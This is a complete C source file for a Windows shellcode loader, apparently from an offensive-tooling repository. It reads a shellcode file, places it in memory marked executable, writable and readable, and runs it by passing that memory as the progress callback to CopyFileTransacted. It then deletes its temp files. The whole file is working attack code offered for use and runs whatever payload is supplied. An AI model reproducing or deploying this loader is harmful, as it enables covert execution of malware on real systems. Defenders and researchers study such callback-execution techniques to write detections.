// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "KtmW32.lib")

#include <stdio.h>
#include <windows.h>
#include <ktmw32.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	HANDLE hTransaction = NULL;

	if (argc != 2)
	{
		printf("Usage: CopyFileTransacted.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	//Create a file to copy
	hFile = CreateFile(L"C:\\Windows\\Temp\\Blank.txt", FILE_READ_DATA, FILE_SHARE_READ, 
		NULL, OPEN_ALWAYS, 0, NULL);

	CloseHandle(hFile);

	//Create copy transaction
	hTransaction = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	CopyFileTransacted(L"C:\\Windows\\Temp\\Blank.txt", L"C:\\Windows\\Temp\\Blankagain.txt", 
		(LPPROGRESS_ROUTINE)hAlloc, NULL, FALSE, 0x0, hTransaction);

	//Execute
	CommitTransaction(hTransaction);

	//Delete the files
	DeleteFile(L"C:\\Windows\\Temp\\Blank.txt");
	DeleteFile(L"C:\\Windows\\Temp\\Blankagain.txt");

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hTransaction)
		CloseHandle(hTransaction);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}